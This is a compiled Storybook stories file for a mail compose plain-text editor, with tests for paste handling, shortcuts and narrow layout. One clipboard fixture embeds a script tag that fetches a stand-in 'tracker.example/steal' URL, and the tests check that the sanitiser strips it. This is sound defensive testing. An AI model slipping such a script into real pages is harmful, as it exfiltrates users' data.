import{j as o,r as y}from"./iframe-uufGNBEn.js";import{C as P}from"./compose-language-chip-BaoA3R-t.js";import{C as S}from"./compose-mode-toggle-cB6vyUO0.js";import{P as B}from"./plain-text-editor-BBKfqjiN.js";import"./preload-helper-PPVm8Dsz.js";import"./cn-d2XQ1MEC.js";import"./compose-language-B4uv5zOH.js";import"./roving-focus-C30yPp50.js";import"./button-Wi0n0Lyz.js";import"./banner-D7bQEtJc.js";import"./x-CuwWA0oJ.js";import"./createLucideIcon-Bn-Stmx4.js";import"./rich-text-document-Dd4zTfcc.js";import"./purify.es-P3vI1IgJ.js";const{expect:n,fn:A,userEvent:b}=__STORYBOOK_MODULE_TEST__,f=["| Region | Total |","| --- | --- |","| EMEA | 412 |","| Americas | 388 |"].join(`
`),v=['<meta charset="utf-8">',"<style>.hdr{color:#c00}</style>",'<h2 class="hdr" style="color:#c00">Quarterly numbers</h2>',"<p>Highlights <strong>this quarter</strong>:</p>","<table><thead><tr><th>Region</th><th>Total</th></tr></thead>","<tbody><tr><td>EMEA</td><td>412</td></tr></tbody></table>",'<script>fetch("https://tracker.example/steal")<\/script>'].join(""),w="Quarterly numbers Highlights this quarter:",L=({initial:e="",onSubmit:t})=>{const[a,r]=y.useState(e),[d,C]=y.useState("plain"),[E,T]=y.useState("nl");return o.jsx(B,{value:a,onChange:r,onSubmit:t,lang:E,trailing:o.jsxs(o.Fragment,{children:[o.jsx(P,{language:E,languages:["nl","en","de"],source:"detected",onSelect:T}),o.jsx(S,{mode:d,onToggle:()=>C(d==="plain"?"rich":"plain")})]})})},W={title:"Mail/PlainTextEditor",component:L,parameters:{layout:"centered"},decorators:[e=>o.jsx("div",{"data-testid":"body-area",className:"flex h-[420px] w-[640px] flex-col overflow-auto rounded-md border border-line bg-canvas",children:o.jsx(e,{})})]},x=async(e,t)=>{const a=e.querySelector("[data-testid=compose-body-plain]");if(!a)throw new Error("the plain surface is not mounted");a.focus();const r=new DataTransfer;return t.html!==void 0&&r.setData("text/html",t.html),t.text!==void 0&&r.setData("text/plain",t.text),a.dispatchEvent(new ClipboardEvent("paste",{bubbles:!0,cancelable:!0,clipboardData:r})),a},m={name:"Empty"},p={name:"A written note",args:{initial:`Thanks — that works for me.

I'll send the deck tomorrow morning, before the standup.`}},s={name:"Holding a pasted pipe table",args:{initial:`Numbers for the quarter:

${f}
`}},u={name:"Pasting a web page",play:async({canvasElement:e})=>{const t=await x(e,{html:v,text:w});await n(t.value).toContain("## Quarterly numbers"),await n(t.value).toContain("| EMEA | 412 |"),await n(t.value).not.toContain("<script"),await n(t.value).not.toContain("style=")}},h={name:"Pasting a clipboard with no HTML",play:async({canvasElement:e})=>{const t=await x(e,{text:"Ship it on Friday."});await n(t.value).toBe("Ship it on Friday.")}},i={name:"Ctrl+Shift+V takes the text flavour",play:async({canvasElement:e})=>{const t=e.querySelector("[data-testid=compose-body-plain]");if(!t)throw new Error("the plain surface is not mounted");t.focus(),t.dispatchEvent(new KeyboardEvent("keydown",{bubbles:!0,cancelable:!0,key:"v",ctrlKey:!0,shiftKey:!0})),await x(e,{html:v,text:w}),await n(t.value).toBe(w),await n(t.value).not.toContain("|")}},c={name:"Pasting an image on its own",play:async({canvasElement:e})=>{const t=await x(e,{html:'<img src="https://example.com/cat.png">',text:""});await n(t.value).toBe(""),await n(e.textContent).toContain("Nothing to paste. The copied content was an image, or had no text in it.")}},g={name:"Cmd+Enter sends",args:{initial:"Ready to go.",onSubmit:A()},play:async({args:e,canvasElement:t})=>{const a=t.querySelector("[data-testid=compose-body-plain]");if(!a)throw new Error("the plain surface is not mounted");await b.click(a),await b.keyboard("{Meta>}{Enter}{/Meta}"),await n(e.onSubmit).toHaveBeenCalled()}},l={name:"At 390",args:{initial:f},decorators:[e=>o.jsx("div",{className:"flex h-[420px] w-[390px] flex-col overflow-auto rounded-md border border-line bg-canvas",children:o.jsx(e,{})})],play:async({canvasElement:e})=>{const t=e.querySelector("[data-testid=compose-mode-toggle]"),a=e.firstElementChild;if(!t||!a)throw new Error("the toolbar is not mounted");const r=t.getBoundingClientRect(),d=a.getBoundingClientRect();await n(r.right).toBeLessThanOrEqual(d.right+1),await n(t).toHaveAttribute("aria-pressed","true")}};m.parameters={...m.parameters,docs:{...m.parameters?.docs,source:{originalSource:`{
  name: "Empty"
}`,...m.parameters?.docs?.source}}};p.parameters={...p.parameters,docs:{...p.parameters?.docs,source:{originalSource:`{
  name: "A written note",
  args: {
    initial: "Thanks — that works for me.\\n\\nI'll send the deck tomorrow morning, before the standup."
  }
}`,...p.parameters?.docs?.source}}};s.parameters={...s.parameters,docs:{...s.parameters?.docs,source:{originalSource:`{
  name: "Holding a pasted pipe table",
  args: {
    initial: \`Numbers for the quarter:\\n\\n\${PIPE_TABLE}\\n\`
  }
}`,...s.parameters?.docs?.source},description:{story:"Monospace with no soft wrap, so the columns line up as a table.",...s.parameters?.docs?.description}}};u.parameters={...u.parameters,docs:{...u.parameters?.docs,source:{originalSource:`{
  name: "Pasting a web page",
  play: async ({
    canvasElement
  }) => {
    const textarea = await dispatchPaste(canvasElement, {
      html: CLIPBOARD_HTML,
      text: CLIPBOARD_TEXT
    });
    await expect(textarea.value).toContain("## Quarterly numbers");
    await expect(textarea.value).toContain("| EMEA | 412 |");
    await expect(textarea.value).not.toContain("<script");
    await expect(textarea.value).not.toContain("style=");
  }
}`,...u.parameters?.docs?.source}}};h.parameters={...h.parameters,docs:{...h.parameters?.docs,source:{originalSource:`{
  name: "Pasting a clipboard with no HTML",
  play: async ({
    canvasElement
  }) => {
    const textarea = await dispatchPaste(canvasElement, {
      text: "Ship it on Friday."
    });
    await expect(textarea.value).toBe("Ship it on Friday.");
  }
}`,...h.parameters?.docs?.source}}};i.parameters={...i.parameters,docs:{...i.parameters?.docs,source:{originalSource:`{
  name: "Ctrl+Shift+V takes the text flavour",
  play: async ({
    canvasElement
  }) => {
    const textarea = canvasElement.querySelector<HTMLTextAreaElement>("[data-testid=compose-body-plain]");
    if (!textarea) throw new Error("the plain surface is not mounted");
    textarea.focus();
    textarea.dispatchEvent(new KeyboardEvent("keydown", {
      bubbles: true,
      cancelable: true,
      key: "v",
      ctrlKey: true,
      shiftKey: true
    }));
    await dispatchPaste(canvasElement, {
      html: CLIPBOARD_HTML,
      text: CLIPBOARD_TEXT
    });
    await expect(textarea.value).toBe(CLIPBOARD_TEXT);
    await expect(textarea.value).not.toContain("|");
  }
}`,...i.parameters?.docs?.source},description:{story:"`Ctrl+Shift+V` takes the text flavour, matching Gmail and Apple Mail.",...i.parameters?.docs?.description}}};c.parameters={...c.parameters,docs:{...c.parameters?.docs,source:{originalSource:`{
  name: "Pasting an image on its own",
  play: async ({
    canvasElement
  }) => {
    const textarea = await dispatchPaste(canvasElement, {
      html: '<img src="https://example.com/cat.png">',
      text: ""
    });
    await expect(textarea.value).toBe("");
    await expect(canvasElement.textContent).toContain("Nothing to paste. The copied content was an image, or had no text in it.");
  }
}`,...c.parameters?.docs?.source},description:{story:`The one paste that gets a notice is the one that inserts nothing. A paste with
no visible result is the dead button the repo's error rule forbids.`,...c.parameters?.docs?.description}}};g.parameters={...g.parameters,docs:{...g.parameters?.docs,source:{originalSource:`{
  name: "Cmd+Enter sends",
  args: {
    initial: "Ready to go.",
    onSubmit: fn()
  },
  play: async ({
    args,
    canvasElement
  }) => {
    const textarea = canvasElement.querySelector<HTMLTextAreaElement>("[data-testid=compose-body-plain]");
    if (!textarea) throw new Error("the plain surface is not mounted");
    await userEvent.click(textarea);
    await userEvent.keyboard("{Meta>}{Enter}{/Meta}");
    await expect(args.onSubmit).toHaveBeenCalled();
  }
}`,...g.parameters?.docs?.source}}};l.parameters={...l.parameters,docs:{...l.parameters?.docs,source:{originalSource:`{
  name: "At 390",
  args: {
    initial: PIPE_TABLE
  },
  decorators: [Story => <div className="flex h-[420px] w-[390px] flex-col overflow-auto rounded-md border border-line bg-canvas">
                <Story />
            </div>],
  play: async ({
    canvasElement
  }) => {
    const toggle = canvasElement.querySelector<HTMLElement>("[data-testid=compose-mode-toggle]");
    const frame = canvasElement.firstElementChild;
    if (!toggle || !frame) throw new Error("the toolbar is not mounted");
    const toggleBox = toggle.getBoundingClientRect();
    const frameBox = frame.getBoundingClientRect();
    await expect(toggleBox.right).toBeLessThanOrEqual(frameBox.right + 1);
    await expect(toggle).toHaveAttribute("aria-pressed", "true");
  }
}`,...l.parameters?.docs?.source},description:{story:`At 390 the toggle stays reachable: the label is the last element in the
toolbar's DOM and is pinned outside anything that scrolls.`,...l.parameters?.docs?.description}}};const X=["Empty","WrittenNote","PastedTable","PasteHtml","PasteTextOnly","PastePlainRequested","PasteWithNothingInIt","CommandEnterSends","Narrow"];export{g as CommandEnterSends,m as Empty,l as Narrow,u as PasteHtml,i as PastePlainRequested,h as PasteTextOnly,c as PasteWithNothingInIt,s as PastedTable,p as WrittenNote,X as __namedExportsOrder,W as default};
